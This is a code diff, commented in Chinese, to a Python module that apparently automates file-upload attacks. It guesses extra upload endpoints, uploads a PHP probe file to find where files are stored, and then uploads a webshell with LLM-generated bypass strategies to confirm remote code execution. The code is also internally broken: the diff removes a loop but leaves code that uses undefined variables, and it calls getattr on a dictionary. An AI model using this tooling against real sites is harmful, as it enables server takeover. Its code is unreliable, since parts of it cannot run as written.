@@ -165,14 +165,57 @@ class UnifiedUploadAuditModule(BaseModule):
 
         print(f"  [UploadAgent] 启动 LLM 智能决策与自纠错上传漏洞测试 Agent (端点数: {len(upload_forms)})...")
 
-        for form_idx, form in enumerate(upload_forms, 1):
+        # ── 自动扩展：从已发现的上传点推导出同类"增/改"操作的上传端点 ─────────
+        # 同一系统的 upload/insert/update/edit 通常共用同一套文件存储逻辑，
+        # 所以先提取 base_page，然后对 action=update/edit/avatar/image 等都发探测请求看看能不能上传
+
+        # 1. scan action_pages 页面里所有 "已知可能用于文件操作" 的 action 变体
+        action_variants = []
+        for _vform in upload_forms:
+            _vu = _vform.get("source_url", "") or _vform.get("action_url", "") or ""
+            base_url = urllib.parse.urlparse(_vu)
+            base_path = base_url.path
+            base_domain = base_url.netloc
+
+            # 尝试从 URL 中推断 "父级" 页面名（如 shirt.php, avatar.php）
+            import re
+            path_match = re.search(r'([^/?]+\.php)', base_path)
+            page_name = path_match.group(1) if path_match else None
+
+            if page_name:
+                # 对同一页面的不同 action 做 HTTP 请求探测是否有文件上传控件
+                potential_actions = ["update", "edit", "update_image", "avatar", "image", "upload", "save"]
+                for act in potential_actions:
+                    candidate = f"{base_domain}{base_path.split(page_name)[0]}{page_name}?action={act}"
+                    try:
+                        cand_resp = self.requester.get(candidate)
+                        if cand_resp and cand_resp.text and len(cand_resp.text) > 500:
+                            from web_audit.core.parser import PageParser
+                            cp = PageParser(cand_resp.text, candidate)
+                            upload_candidates = cp.get_upload_forms()
+                            if upload_candidates:
+                                action_variants.append({
+                                    "action_url": candidate,
+                                    "source_url": candidate,
+                                    "file_input_names": [f["inputs"][0]["name"] if f["inputs"] else "file"],
+                                    "action": act,
+                                    "base_page": page_name,
+                                    "found_via": f"action={act} 变体探测"
+                                })
+                    except Exception:
+                        continue
+
+        # 按发现顺序排：已发现的 upload_forms 排最前，新增的变体放后面
+        all_forms = list(upload_forms) + action_variants
+
+        for form_idx, form in enumerate(all_forms, 1):
             action_url = form.get("action_url") or url
             file_params = form.get("file_input_names", [])
             file_param = file_params[0] if file_params else "file"
             accept_types = form.get("accepted_types", [])
             source_page = form.get("found_on_page") or form.get("source_url") or action_url
 
-            print(f"\n  [{form_idx}/{len(upload_forms)}] 正在为端点 [{action_url}] 启动 Agent 决策链 (参数: '{file_param}')...")
+            print(f"\n  [{form_idx}/{len(all_forms)}] 正在为端点 [{action_url}] 启动 Agent 决策链 (参数: '{file_param}')...")
 
             # ── 阶段 1: LLM 动态策略生成 ─────────────────────────────
             strategies = self._generate_llm_strategies(
@@ -183,27 +226,14 @@ class UnifiedUploadAuditModule(BaseModule):
             )
             print(f"  [StrategyAgent] LLM 成功生成 {len(strategies)} 组针对性绕过策略。")
 
-            # 收集 baseline DOM 链接（用于上传 POST 后的差异对比）
+            # 收集表单其他额外隐藏字段（⚠️ 必须提前：后续多个步骤需要）
+            form_data = self._extract_extra_form_fields(source_page, action_url)
+
+            # 收集 baseline DOM 链接（上传 POST 后的差异对比）
             observation_pages = self._build_observation_pages(source_page, url, action_url, form)
             baseline_links = self._collect_baseline_links(observation_pages)
 
-            form_vulnerable = False
-
-            # ── 阶段 2 & 3 & 4: LLM 决策执行 + 自纠错循环 ────────────
-            for strat_idx, strategy in enumerate(strategies, 1):
-                if form_vulnerable:
-                    break  # 如果当前表单已经验证成功 RCE，停止尝试后续策略
-
-                strat_name = strategy.name
-                suffix = strategy.filename_suffix
-                content_type = strategy.content_type
-                filename = f"{uuid.uuid4().hex[:6]}_{strat_name.replace(' ', '_')}{suffix}"
-
-                print(f"\n    → [Round {strat_idx}/{len(strategies)}] 执行策略: '{strat_name}' | 文件名: {filename} | Content-Type: {content_type}")
-                print(f"       (依据: {strategy.rationale[:70]}...)")
-
-                # 收集表单其他额外隐藏字段
-                form_data = self._extract_extra_form_fields(source_page, action_url)
+            # ── 先传一个无害测试文件，摸底文件存储路径规律 ─────────
 
                 # 发送物理上传请求
                 resp = self._send_upload(action_url, file_param, filename, self.webshell_content, content_type, form_data)
@@ -212,7 +242,14 @@ class UnifiedUploadAuditModule(BaseModule):
                     continue
 
                 # ── 尝试寻找 Webshell 真实路径 ────────────────────────
-                path = self._extract_webshell_path(
+                # 如果已通过测试文件找到 URL 规律，优先用该规律推测
+                webshell_path = None
+                if test_file_url and action_url:
+                    # 从测试文件 URL 中推断 webshell 的存放规律（如 /uploads/ + UUID + 后缀）
+                    test_base = test_file_url.rsplit('/', 1)[0] + '/'
+                    webshell_path = self._infer_webshell_path(action_url, source_page, test_base, filename)
+
+                path = webshell_path if webshell_path else self._extract_webshell_path(
                     resp, filename, baseline_links, action_url, strat_name, "", source_page,
                     # 传入 observation_pages：上传阶段已发现的所有后台页面，
                     # 作为"已知可能展示上传文件的页面"进行扫描
@@ -597,6 +634,136 @@ class UnifiedUploadAuditModule(BaseModule):
                     return link
 
         return None
+
+    def _upload_test_file(self, action_url: str, file_param: str, form_data: Dict[str, str], accept_types: List[str], source_page: str, observation_pages: List[str], baseline_links: Set[str]) -> Optional[str]:
+        """
+        上传一个无害测试文件（phpinfo），找出文件存放路径规律。
+        这是为后续 webshell 上传打基础：先知道真实存储 URL 格式。
+        """
+        print(f"\n      [探路] 上传无害测试文件 to [{action_url}] 摸底文件存储位置...")
+        test_filename = f"{uuid.uuid4().hex[:6]}_test_probe.php"
+        test_content = b"<?php echo 'TEST_PROBE_MARKER_A1B2C3'; ?>"
+        # 探测 MIME 类型（通常图片上传接口的 MIME 类型是 image/jpeg 等）
+        test_content_type = "image/jpeg" if "image" in str(accept_types).lower() else "application/x-httpd-php"
+
+        resp = self._send_upload(action_url, file_param, test_filename, test_content, test_content_type, form_data)
+        if not resp:
+            print(f"      [-] 探路测试上传失败，跳过。")
+            return None
+
+        # 尝试从响应中提取路径
+        path = self._extract_webshell_path(resp, test_filename, baseline_links, action_url, "test_probe", "", source_page, observation_pages)
+        if path:
+            # 确认测试文件是否真正可访问且包含探针标记
+            full_url = urllib.parse.urljoin(source_page or action_url, path)
+            print(f"      [探路] 尝试访问: {full_url}")
+            try:
+                test_resp = self.requester.get(full_url)
+                if test_resp and "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
+                    print(f"      [探路✅] 成功！测试文件可访问，URL: {full_url}")
+                    # 保存测试文件的文件名和后缀，用于后续文件命名推断
+                    self._test_file_info = {"url": full_url, "filename": test_filename, "action_url": action_url}
+                    return full_url
+                elif test_resp and test_resp.status_code == 200:
+                    print(f"      [探路✅] 文件存在但探针未执行（可能是静态文件/重命名）。URL: {full_url}")
+                    self._test_file_info = {"url": full_url, "filename": test_filename, "action_url": action_url, "status_code": test_resp.status_code}
+                    return full_url
+                else:
+                    print(f"      [探路] 文件返回 {test_resp.status_code if test_resp else 'None'}，可能 404。")
+            except Exception:
+                pass
+
+        print(f"      [探路] 未能从上传响应中定位路径，尝试扫描已知页面...")
+        # 扫描已知页面找测试文件
+        test_file_info = None
+        shell_exts = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar', '.jsp', '.jspx', '.shtml']
+
+        for page_url in observation_pages:
+            if not page_url or page_url == source_page or page_url == action_url:
+                continue
+            try:
+                page_html = self.requester.fetch_rendered_html(page_url)
+                if not page_html:
+                    continue
+                page_links = self._extract_all_links(page_html)
+                for link in page_links:
+                    # 检查链接是否包含测试文件命名特征（UUID_0 格式的后半部分）
+                    if "/uploads/" in link.lower() or "/files/" in link.lower() or "/upload/" in link.lower():
+                        # 尝试访问该 URL 看是否包含探针标记
+                        full_test_url = urllib.parse.urljoin(page_url, link)
+                        try:
+                            test_resp = self.requester.get(full_test_url)
+                            if test_resp and "TEST_PROBE_MARKER_A1B2C3" in test_resp.text:
+                                print(f"      [探路✅] 在页面 {page_url} 中找到测试文件: {full_test_url}")
+                                test_file_info = {"url": full_test_url, "filename": test_filename, "action_url": action_url}
+                                break
+                        except Exception:
+                            pass
+                if test_file_info:
+                    break
+            except Exception:
+                continue
+
+        if test_file_info:
+            self._test_file_info = test_file_info
+            return test_file_info["url"]
+
+        print(f"      [探路] 未能找到测试文件路径。")
+        return None
+
+    def _infer_webshell_path(self, action_url: str, source_page: str, test_url_base: str, filename: str) -> Optional[str]:
+        """
+        基于测试文件 URL 推断 webshell 的存储路径。
+        例如：测试文件在 /uploads/abc123_test_probe.php
+        → webshell 可能在 /uploads/ + UUID_hex_prefix + suffix
+        """
+        if not self._test_file_info or not test_url_base:
+            return None
+
+        test_filename = self._test_file_info.get("filename", "")
+        test_url = self._test_file_info.get("url", "")
+
+        # 分析测试文件 URL 规律
+        # 规律可能是: /uploads/ + {timestamp}_{uuid}.{ext}
+        # 或: /uploads/ + {uuid}_{strategy}.{ext}
+        # 核心：测试文件 URL 的结构就是 webshell 的路径格式
+
+        # 从 URL 中提取路径和扩展名
+        import re
+        url_path_match = re.search(r'(https?://[^/]+)(/[^?]+)', test_url)
+        if not url_path_match:
+            return None
+
+        base_url = url_path_match.group(1)
+        test_path = url_path_match.group(2)  # 例如: /uploads/abc123_test_probe.php
+
+        # 推断 webshell 路径：用 webshell 文件名替换测试文件名
+        # 如果测试文件名是 UUID_hex + _ + suffix + ext
+        # 则 webshell 文件名也是 UUID_hex + _ + strategy + ext
+        upload_prefix = "/uploads/"  # 或从 path 中提取
+        if "/uploads/" not in test_path:
+            # 尝试提取路径前缀（到最后一个 / 为止）
+            path_parts = test_path.rsplit("/", 1)
+            if len(path_parts) == 2:
+                upload_path_prefix = path_parts[0] + "/"
+            else:
+                return None
+        else:
+            # 保留 /uploads/ 目录结构
+            import os
+            upload_path_prefix = test_path.rsplit("/", 1)[0] + "/"
+
+        # 构造 webshell URL（保持目录结构，用新的测试文件名）
+        # 注意：由于不知道服务器的重命名规则，我们无法精确构造
+        # 但我们可以尝试访问测试文件 URL（如果探针成功，说明路径是对的）
+
+        if "TEST_PROBE_MARKER_A1B2C3" in str(getattr(self._test_file_info, 'status_code', '')):
+            # 测试探针成功执行了，直接返回测试 URL 用于 webshell 验证
+            return test_path
+
+        print(f"      [推断] 测试文件 URL: {test_url}")
+        print(f"      [推断] 推断 webshell 路径: {upload_path_prefix}（具体文件名需依赖后续扫描）")
+        return upload_path_prefix
 
     def _verify_and_diagnose(self, webshell_url: str, filename: str) -> Optional[DiagnosticResult]:
         """访问推算出的 Webshell URL，并交给 Diagnostic Agent 进行分析与诊断。"""
